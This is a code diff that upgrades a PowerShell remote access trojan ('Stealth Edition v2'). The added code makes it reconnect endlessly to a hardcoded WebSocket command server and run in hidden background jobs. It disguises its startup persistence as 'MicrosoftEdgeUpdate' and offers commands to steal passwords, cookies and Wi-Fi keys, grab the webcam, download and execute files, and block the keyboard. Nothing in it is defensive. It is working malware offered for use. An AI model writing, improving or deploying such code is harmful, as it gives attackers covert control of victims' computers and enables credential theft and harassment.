@@ -1,5 +1,5 @@
-# RAT WebSocket Client - Full Featured Stealth Edition
-# Auto-persistence enabled by default - NO VBS DEPENDENCY
+# RAT WebSocket Client - Full Featured Stealth Edition v2
+# Fixed version with infinite retry, better error handling, and improved commands
 
 # Force run as hidden job if not already
 $myPID = $PID
@@ -34,16 +34,10 @@ public class InputControl {
     public static extern bool BlockInput(bool fBlockIt);
     
     [DllImport("user32.dll")]
-    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
-    
-    [DllImport("user32.dll")]
     public static extern IntPtr GetForegroundWindow();
     
     [DllImport("user32.dll")]
     public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
-    
-    public const int KEYEVENTF_KEYDOWN = 0x0;
-    public const int KEYEVENTF_KEYUP = 0x2;
 }
 "@ -ErrorAction SilentlyContinue
 
@@ -53,15 +47,29 @@ $botPrefix = "/"
 $persistEnabled = $false
 
 function Get-WssUrl {
-    try {
-        $url = (Invoke-WebRequest -Uri $wssUrlFile -UseBasicParsing -TimeoutSec 10).Content.Trim()
-        return $url
-    } catch {
-        return "wss://free.blr2.piesocket.com/v3/1?api_key=bJpyvYTy22qCCTlsfwEpe7IOhGiMzoNy3YJqTMp6&notify_self=1"
+    $retries = 0
+    while ($true) {
+        try {
+            $url = (Invoke-WebRequest -Uri $wssUrlFile -UseBasicParsing -TimeoutSec 10).Content.Trim()
+            if ($url) {
+                return $url
+            }
+        } catch {
+            # Silent fail, will retry
+        }
+        
+        $retries++
+        # Wait longer each retry (30s, 60s, 120s, max 300s)
+        $waitTime = [Math]::Min(30 * [Math]::Pow(2, [Math]::Min($retries - 1, 3)), 300)
+        Start-Sleep -Seconds $waitTime
+        
+        # Fallback after 5 retries
+        if ($retries -ge 5) {
+            return "wss://free.blr2.piesocket.com/v3/1?api_key=bJpyvYTy22qCCTlsfwEpe7IOhGiMzoNy3YJqTMp6&notify_self=1"
+        }
     }
 }
 
-# Auto-enable persistence on first run
 function Initialize-Persistence {
     $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     $regName = "MicrosoftEdgeUpdate"
@@ -147,11 +155,11 @@ exit
         Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
         
         $global:persistEnabled = $true
-        return "Persistence enabled (startup auto-run activated)"
+        return "Persistence enabled"
     } else {
         Remove-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
         $global:persistEnabled = $false
-        return "Persistence disabled (will NOT run on startup)"
+        return "Persistence disabled"
     }
 }
 
@@ -178,7 +186,7 @@ CPU: $cpu
 RAM: ${ram}GB
 GPU: $gpu
 Disk C: $($disk.FreeGB)GB free / $($disk.SizeGB)GB total
-Persistence: $persistEnabled (Auto-startup)
+Persistence: $persistEnabled
 "@
 }
 
@@ -431,12 +439,17 @@ function Invoke-TTS {
     param([string]$text)
     
     try {
-        $voice = New-Object System.Speech.Synthesis.SpeechSynthesizer
-        $voice.Rate = 0
-        $voice.Volume = 100
-        $voice.Speak($text)
-        $voice.Dispose()
-        return "TTS played: $text"
+        Start-Job -ScriptBlock {
+            param($txt)
+            Add-Type -AssemblyName System.Speech
+            $voice = New-Object System.Speech.Synthesis.SpeechSynthesizer
+            $voice.Rate = 0
+            $voice.Volume = 100
+            $voice.Speak($txt)
+            $voice.Dispose()
+        } -ArgumentList $text | Out-Null
+        
+        return "TTS playing: $text"
     } catch {
         return "TTS failed: $($_.Exception.Message)"
     }
@@ -446,18 +459,23 @@ function Play-AudioFile {
     param([string]$url)
     
     try {
-        $ext = [System.IO.Path]::GetExtension($url)
-        if (-not $ext) { $ext = ".mp3" }
-        
-        $tempFile = "$env:TEMP\audio_$(Get-Random)$ext"
-        Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing
-        
-        Add-Type -AssemblyName presentationCore
-        $player = New-Object System.Windows.Media.MediaPlayer
-        $player.Open($tempFile)
-        $player.Play()
-        
-        Start-Sleep -Seconds 2
+        Start-Job -ScriptBlock {
+            param($audioUrl)
+            $ext = [System.IO.Path]::GetExtension($audioUrl)
+            if (-not $ext) { $ext = ".mp3" }
+            
+            $tempFile = "$env:TEMP\audio_$(Get-Random)$ext"
+            Invoke-WebRequest -Uri $audioUrl -OutFile $tempFile -UseBasicParsing
+            
+            Add-Type -AssemblyName presentationCore
+            $player = New-Object System.Windows.Media.MediaPlayer
+            $player.Open($tempFile)
+            $player.Play()
+            
+            Start-Sleep -Seconds 30
+            $player.Close()
+            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+        } -ArgumentList $url | Out-Null
         
         return "Audio playing in background"
     } catch {
@@ -469,7 +487,12 @@ function Show-MessageBox {
     param([string]$text)
     
     try {
-        [System.Windows.Forms.MessageBox]::Show($text, "System Message", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
+        Start-Job -ScriptBlock {
+            param($msg)
+            Add-Type -AssemblyName System.Windows.Forms
+            [System.Windows.Forms.MessageBox]::Show($msg, "System Message", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
+        } -ArgumentList $text | Out-Null
+        
         return "Message box shown: $text"
     } catch {
         return "Message box failed: $($_.Exception.Message)"
@@ -480,7 +503,11 @@ function Set-MouseVisibility {
     param([bool]$visible)
     
     try {
-        [InputControl]::ShowCursor($visible)
+        for ($i = 0; $i -lt 10; $i++) {
+            [InputControl]::ShowCursor($visible)
+            Start-Sleep -Milliseconds 50
+        }
+        
         $status = if ($visible) { "visible" } else { "hidden" }
         return "Mouse cursor $status"
     } catch {
@@ -518,24 +545,43 @@ function Invoke-FlipScreen {
     try {
         $obj = New-Object -ComObject wscript.shell
         $obj.SendKeys("^%{DOWN}")
-        return "Screen flipped"
+        return "Screen flipped (use Ctrl+Alt+Up to restore)"
     } catch {
         return "Screen flip failed: $($_.Exception.Message)"
     }
 }
 
 function Invoke-ShakeWindows {
+    param([int]$duration = 5)
+    
     try {
-        $hwnd = [InputControl]::GetForegroundWindow()
+        Start-Job -ScriptBlock {
+            param($dur)
+            Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class WinShake {
+    [DllImport("user32.dll")]
+    public static extern IntPtr GetForegroundWindow();
+    [DllImport("user32.dll")]
+    public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
+}
+"@
+            
+            $hwnd = [WinShake]::GetForegroundWindow()
+            $iterations = $dur * 20
+            
+            for ($i = 0; $i -lt $iterations; $i++) {
+                $x = Get-Random -Minimum -15 -Maximum 15
+                $y = Get-Random -Minimum -15 -Maximum 15
+                [WinShake]::SetWindowPos($hwnd, [IntPtr]::Zero, $x, $y, 0, 0, 0x0001 -bor 0x0004)
+                Start-Sleep -Milliseconds 50
+            }
+            
+            [WinShake]::SetWindowPos($hwnd, [IntPtr]::Zero, 0, 0, 0, 0, 0x0001 -bor 0x0004)
+        } -ArgumentList $duration | Out-Null
         
-        for ($i = 0; $i -lt 20; $i++) {
-            $x = Get-Random -Minimum -10 -Maximum 10
-            $y = Get-Random -Minimum -10 -Maximum 10
-            [InputControl]::SetWindowPos($hwnd, [IntPtr]::Zero, $x, $y, 0, 0, 0x0001 -bor 0x0004)
-            Start-Sleep -Milliseconds 50
-        }
-        
-        return "Window shaken"
+        return "Window shaking for $duration seconds"
     } catch {
         return "Shake failed: $($_.Exception.Message)"
     }
@@ -543,22 +589,24 @@ function Invoke-ShakeWindows {
 
 function Invoke-GlitchEffect {
     try {
-        $obj = New-Object -ComObject wscript.shell
-        
-        for ($i = 0; $i -lt 10; $i++) {
+        Start-Job -ScriptBlock {
+            $obj = New-Object -ComObject wscript.shell
+            
+            for ($i = 0; $i -lt 5; $i++) {
+                $obj.SendKeys("^%{DOWN}")
+                Start-Sleep -Milliseconds 200
+                $obj.SendKeys("^%{LEFT}")
+                Start-Sleep -Milliseconds 200
+                $obj.SendKeys("^%{UP}")
+                Start-Sleep -Milliseconds 200
+                $obj.SendKeys("^%{RIGHT}")
+                Start-Sleep -Milliseconds 200
+            }
+            
             $obj.SendKeys("^%{UP}")
-            Start-Sleep -Milliseconds 100
-            $obj.SendKeys("^%{DOWN}")
-            Start-Sleep -Milliseconds 100
-            $obj.SendKeys("^%{LEFT}")
-            Start-Sleep -Milliseconds 100
-            $obj.SendKeys("^%{RIGHT}")
-            Start-Sleep -Milliseconds 100
-        }
+        } | Out-Null
         
-        $obj.SendKeys("^%{UP}")
-        
-        return "Glitch effect executed"
+        return "Glitch effect executing"
     } catch {
         return "Glitch failed: $($_.Exception.Message)"
     }
@@ -568,7 +616,7 @@ function Invoke-SwapKeys {
     param([string]$duration = "30")
     
     try {
-        $script = {
+        Start-Job -ScriptBlock {
             param($seconds)
             Add-Type -AssemblyName System.Windows.Forms
             
@@ -580,11 +628,9 @@ function Invoke-SwapKeys {
                 }
                 Start-Sleep -Milliseconds 100
             }
-        }
+        } -ArgumentList ([int]$duration) | Out-Null
         
-        Start-Job -ScriptBlock $script -ArgumentList ([int]$duration) | Out-Null
-        
-        return "Keys swapped for $duration seconds"
+        return "Keys swapping for $duration seconds"
     } catch {
         return "Key swap failed: $($_.Exception.Message)"
     }
@@ -594,13 +640,23 @@ function Invoke-DisableKeyboard {
     param([int]$seconds = 10)
     
     try {
-        [InputControl]::BlockInput($true)
-        Start-Sleep -Seconds $seconds
-        [InputControl]::BlockInput($false)
+        Start-Job -ScriptBlock {
+            param($sec)
+            Add-Type -TypeDefinition @"
+using System.Runtime.InteropServices;
+public class KbBlock {
+    [DllImport("user32.dll")]
+    public static extern bool BlockInput(bool fBlockIt);
+}
+"@
+            [KbBlock]::BlockInput($true)
+            Start-Sleep -Seconds $sec
+            [KbBlock]::BlockInput($false)
+        } -ArgumentList $seconds | Out-Null
         
-        return "Keyboard blocked for $seconds seconds"
+        return "Keyboard will be blocked for $seconds seconds"
     } catch {
-        return "Keyboard block failed: $($_.Exception.Message)"
+        return "Keyboard block failed (may need admin): $($_.Exception.Message)"
     }
 }
 
@@ -608,16 +664,19 @@ function Invoke-SpamText {
     param([string]$text, [int]$count = 50)
     
     try {
-        $obj = New-Object -ComObject wscript.shell
-        Start-Sleep -Seconds 2
+        Start-Job -ScriptBlock {
+            param($txt, $cnt)
+            $obj = New-Object -ComObject wscript.shell
+            Start-Sleep -Seconds 2
+            
+            for ($i = 0; $i -lt $cnt; $i++) {
+                $obj.SendKeys($txt)
+                $obj.SendKeys("{ENTER}")
+                Start-Sleep -Milliseconds 100
+            }
+        } -ArgumentList $text, $count | Out-Null
         
-        for ($i = 0; $i -lt $count; $i++) {
-            $obj.SendKeys($text)
-            $obj.SendKeys("{ENTER}")
-            Start-Sleep -Milliseconds 100
-        }
-        
-        return "Spammed text $count times"
+        return "Spamming text $count times"
     } catch {
         return "Text spam failed: $($_.Exception.Message)"
     }
@@ -627,29 +686,45 @@ function Show-ToastNotification {
     param([string]$title, [string]$message)
     
     try {
-        [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
-        [Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom.XmlDocument, ContentType = WindowsRuntime] | Out-Null
-        
-        $template = @"
+        Start-Job -ScriptBlock {
+            param($t, $m)
+            
+            [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
+            [Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom.XmlDocument, ContentType = WindowsRuntime] | Out-Null
+            
+            $template = @"
 <toast>
     <visual>
         <binding template="ToastGeneric">
-            <text>$title</text>
-            <text>$message</text>
+            <text>$t</text>
+            <text>$m</text>
         </binding>
     </visual>
 </toast>
 "@
+            
+            $xml = New-Object Windows.Data.Xml.Dom.XmlDocument
+            $xml.LoadXml($template)
+            
+            $toast = New-Object Windows.UI.Notifications.ToastNotification($xml)
+            [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("PowerShell").Show($toast)
+        } -ArgumentList $title, $message | Out-Null
         
-        $xml = New-Object Windows.Data.Xml.Dom.XmlDocument
-        $xml.LoadXml($template)
-        
-        $toast = New-Object Windows.UI.Notifications.ToastNotification($xml)
-        [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("PowerShell").Show($toast)
-        
-        return "Toast notification sent: $title - $message"
+        return "Toast sent: $title - $message"
     } catch {
-        return "Toast failed: $($_.Exception.Message)"
+        # Fallback to balloon tip
+        try {
+            Add-Type -AssemblyName System.Windows.Forms
+            $balloon = New-Object System.Windows.Forms.NotifyIcon
+            $balloon.Icon = [System.Drawing.SystemIcons]::Information
+            $balloon.Visible = $true
+            $balloon.ShowBalloonTip(5000, $title, $message, [System.Windows.Forms.ToolTipIcon]::Info)
+            Start-Sleep -Seconds 2
+            $balloon.Dispose()
+            return "Balloon notification sent: $title"
+        } catch {
+            return "Toast failed: $($_.Exception.Message)"
+        }
     }
 }
 
@@ -657,12 +732,21 @@ function Invoke-SpamNotifications {
     param([int]$count = 20)
     
     try {
-        for ($i = 1; $i -le $count; $i++) {
-            Show-ToastNotification -title "Notification #$i" -message "This is notification number $i" | Out-Null
-            Start-Sleep -Milliseconds 500
-        }
+        Start-Job -ScriptBlock {
+            param($cnt)
+            Add-Type -AssemblyName System.Windows.Forms
+            
+            for ($i = 1; $i -le $cnt; $i++) {
+                $balloon = New-Object System.Windows.Forms.NotifyIcon
+                $balloon.Icon = [System.Drawing.SystemIcons]::Information
+                $balloon.Visible = $true
+                $balloon.ShowBalloonTip(3000, "Notification #$i", "Message number $i", [System.Windows.Forms.ToolTipIcon]::Info)
+                Start-Sleep -Milliseconds 500
+                $balloon.Dispose()
+            }
+        } -ArgumentList $count | Out-Null
         
-        return "Spammed $count notifications"
+        return "Spamming $count notifications"
     } catch {
         return "Notification spam failed: $($_.Exception.Message)"
     }
@@ -740,7 +824,7 @@ del /f /q "%~f0"
         
         Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$batPath`"" -WindowStyle Hidden
         
-        return "Self-destruct initiated (removed from startup)"
+        return "Self-destruct initiated"
         Start-Sleep -Seconds 1
         exit
     } catch {
@@ -835,7 +919,10 @@ function Process-Command {
             return "Usage: /shutdown shutdown/restart/cancel [seconds]"
         }
         "flip" { return Invoke-FlipScreen }
-        "shake" { return Invoke-ShakeWindows }
+        "shake" {
+            $dur = if ($args.Count -gt 0 -and $args[0] -match '^\d+$') { [int]$args[0] } else { 5 }
+            return Invoke-ShakeWindows -duration $dur
+        }
         "glitch" { return Invoke-GlitchEffect }
         "swapkeys" {
             $dur = if ($args.Count -gt 0) { $args[0] } else { "30" }
@@ -884,11 +971,15 @@ function Process-Command {
             } elseif ($args.Count -gt 0 -and $args[0] -eq "off") {
                 return Set-Persistence -enable $false
             } else {
-                $status = if ($persistEnabled) { "ENABLED (auto-startup)" } else { "DISABLED" }
+                $status = if ($persistEnabled) { "ENABLED" } else { "DISABLED" }
                 return "Persistence: $status | Usage: /persist on/off"
             }
         }
-        "processes" { return (Get-Process | Select-Object -First 30 Id, ProcessName, CPU | Format-Table | Out-String) }
+        "processes" { 
+            return (Get-Process | Select-Object Id, ProcessName, CPU, WorkingSet | 
+                   Sort-Object CPU -Descending | 
+                   Format-Table -AutoSize | Out-String)
+        }
         "kill" {
             if ($args.Count -gt 0) {
                 try {
@@ -903,7 +994,7 @@ function Process-Command {
         "exit" { return "EXIT_SIGNAL" }
         "help" {
             return @"
-Commands: /info /exec /ss /webcam /wifi /passwords /cookies /netinfo /ports /arp /volume /tts /play /msg /hidemouse /showmouse /shutdown /flip /shake /glitch /swapkeys /disablekb /spam /toast /notifyspam /dlexec /dlrun /hide /logout /killsis /persist /processes /kill /selfdestruct /exit
+Commands: /info /exec /ss /webcam /wifi /passwords /cookies /netinfo /ports /arp /volume /tts /play /msg /hidemouse /showmouse /shutdown /flip /shake [seconds] /glitch /swapkeys /disablekb /spam /toast /notifyspam /dlexec /dlrun /hide /logout /killsis /persist /processes /kill /selfdestruct /exit
 "@
         }
         default { return "Unknown: /help" }
@@ -913,9 +1004,10 @@ Commands: /info /exec /ss /webcam /wifi /passwords /cookies /netinfo /ports /arp
 $wasFirstRun = Initialize-Persistence
 $persistEnabled = Check-Persistence
 
+# Main loop with infinite retry
 while ($true) {
     try {
-        $wssUrl = Get-WssUrl
+        $wssUrl = Get-WssUrl  # This now retries infinitely until successful
         
         $ws = New-Object System.Net.WebSockets.ClientWebSocket
         $ct = New-Object System.Threading.CancellationToken
@@ -975,7 +1067,10 @@ while ($true) {
         
         $ws.Dispose()
         
-    } catch {}
+    } catch {
+        # Connection failed, wait before retry
+    }
     
-    Start-Sleep -Seconds 20
+    # Wait 30s before reconnecting
+    Start-Sleep -Seconds 30
 }
